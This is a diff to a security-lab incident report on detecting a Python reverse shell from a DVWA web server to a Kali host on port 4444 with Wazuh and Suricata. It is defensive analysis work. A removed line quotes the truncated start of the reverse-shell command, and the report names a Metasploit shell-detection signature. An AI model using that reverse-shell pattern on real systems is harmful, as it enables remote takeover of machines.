@@ -10,9 +10,9 @@
 
 | Field | Value |
 |---|---|
-| **Alert ID** | `wzb-a2f073998b` |
-| **Rule ID** | `Wazuh 100602 (Level 8)` |
-| **Source** | Wazuh Auditd & bashcmd decoder on DVWA |
+| **Alert ID** | `wzb-ccae331b77`, `wzb-81bb1f83f7` |
+| **Rule ID** | Suricata SID `3400020` (`POSSBL SCAN SHELL M-SPLOIT TCP`) via `86601` / Wazuh `100199` |
+| **Source** | Suricata Network IDS / Wazuh |
 | **Severity** | High |
 | **TLP / PAP** | `TLP:AMBER / PAP:AMBER` |
 
@@ -20,7 +20,7 @@
 
 ## What was detected
 
-Wazuh Rule 100602 matched on interactive shell execution from www-data: python3 -c import socket,subprocess,os;s=socket.socket... connecting outbound to 192.168.232.135:4444.
+Adversary established an outbound interactive Python reverse shell connection from DVWA (`192.168.56.30`) to Kali (`192.168.232.135:4444`). Suricata SID 3400020 and Wazuh interactive shell monitoring flagged the shell spawn.
 
 ---
 
@@ -36,7 +36,7 @@ Wazuh Rule 100602 matched on interactive shell execution from www-data: python3 
 
 ## Investigation steps
 
-1. Inspected Wazuh alert wzb-a2f073998b for exact command line captured by custom bashcmd decoder.
+1. Inspected Wazuh alert wzb-ccae331b77 for exact command line captured by custom bashcmd decoder.
 2. Verified outbound network socket from DVWA (192.168.56.30) to Kali (192.168.232.135) on port 4444/TCP.
 3. Checked process ancestry: apache2 -> sh -> python3.
 4. Confirmed active interactive shell session established.
@@ -46,9 +46,9 @@ Wazuh Rule 100602 matched on interactive shell execution from www-data: python3 
 
 ## Evidence
 
-- **Attack Evidence:** [`../../02-Attack-Simulation/Attack-Screenshots/19.png`](../../02-Attack-Simulation/Attack-Screenshots/19.png)
+- **Attack Evidence:** [`../../02-Attack-Simulation/Attack-Screenshots/15.png`](../../02-Attack-Simulation/Attack-Screenshots/15.png)
 - **Alert Evidence:** [`../../03-Detection-Engineering/TheHive_Alert-ScreenShot/5.png`](../../03-Detection-Engineering/TheHive_Alert-ScreenShot/5.png)
-- **Raw Telemetry:** Exported in [`06-Resources/Alerts/wazuh_alerts.csv`](../../06-Resources/Alerts/wazuh_alerts.csv) and [`thehive_alerts.json`](../../06-Resources/Alerts/thehive_alerts.json)
+- **Raw Telemetry:** Exported in [`06-Resources/Alerts/wazuh_alerts.csv`](../../06-Resources/Alerts/wazuh_alerts.csv), [`Wazuh-Raw-Alerts.csv`](../../06-Resources/Alerts/Wazuh-Raw-Alerts.csv), and [`thehive_alerts.json`](../../06-Resources/Alerts/thehive_alerts.json)
 
 ---
 
